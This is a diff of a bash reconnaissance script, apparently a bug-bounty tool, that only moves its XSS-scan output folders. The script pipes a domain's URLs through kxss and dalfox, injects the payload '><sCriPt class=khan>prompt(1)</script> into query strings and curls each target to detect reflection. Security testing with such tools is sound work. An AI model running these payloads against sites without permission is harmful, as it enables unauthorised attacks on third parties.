@@ -17,18 +17,11 @@ else
   mkdir ~/reconizer
 fi
 
-if [ -d ~/reconizer/$DOM/vulnerabilities]
+if [ -d ~/reconizer/$DOM/xss_scan/]
 then
   echo " "
 else
-  mkdir ~/reconizer/$DOM/vulnerabilities
-fi
-
-if [ -d ~/reconizer/$DOM/vulnerabilities/xss_scan]
-then
-  echo " "
-else
-  mkdir ~/reconizer/$DOM/vulnerabilities/xss_scan
+  mkdir ~/reconizer/$DOM/xss_scan
 fi
 
 
@@ -51,10 +44,10 @@ echo " "
 if [ -f ~/go/bin/kxss ]
 then
   echo "${magenta} [+] Running kxss ${reset}"
-cat ~/reconizer/$DOM/GF_Patterns/xss.txt | kxss  | tee $DOM/vulnerabilities/xss_scan/kxss.txt
-cat ~/reconizer/$DOM/vulnerabilities/xss_scan/kxss.txt | awk '{print $9}' | sed 's/=.*/=/' | tee ~/reconizer/$DOM/vulnerabilities/xss_scan/kxss1.txt
-cat ~/reconizer/$DOM/vulnerabilities/xss_scan/kxss1.txt | dalfox pipe | tee ~/reconizer/$DOM/vulnerabilities/xss_scan/dalfoxss.txt
-cat ~/reconizer/$DOM/gf/xss.txt | grep "=" | qsreplace "'><sCriPt class=khan>prompt(1)</script>" | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "'><sCriPt class=khan>prompt(1)" && echo "$host \033[0;31mVulnerable\n";done | tee ~/reconizer/$DOM/vulnerabilities/xss_scan/vulnxss.txt
+cat ~/reconizer/$DOM/GF_Patterns/xss.txt | kxss  | tee $DOM/xss_scan/kxss.txt
+cat ~/reconizer/$DOM/xss_scan/kxss.txt | awk '{print $9}' | sed 's/=.*/=/' | tee ~/reconizer/$DOM/xss_scan/kxss1.txt
+cat ~/reconizer/$DOM/xss_scan/kxss1.txt | dalfox pipe | tee ~/reconizer/$DOM/xss_scan/dalfoxss.txt
+cat ~/reconizer/$DOM/gf/xss.txt | grep "=" | qsreplace "'><sCriPt class=khan>prompt(1)</script>" | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "'><sCriPt class=khan>prompt(1)" && echo "$host \033[0;31mVulnerable\n";done | tee ~/reconizer/$DOM/xss_scan/vulnxss.txt
 else
   echo "${blue} [+] Installing xss ${reset}"
    go get -u github.com/tomnomnom/hacks/kxss
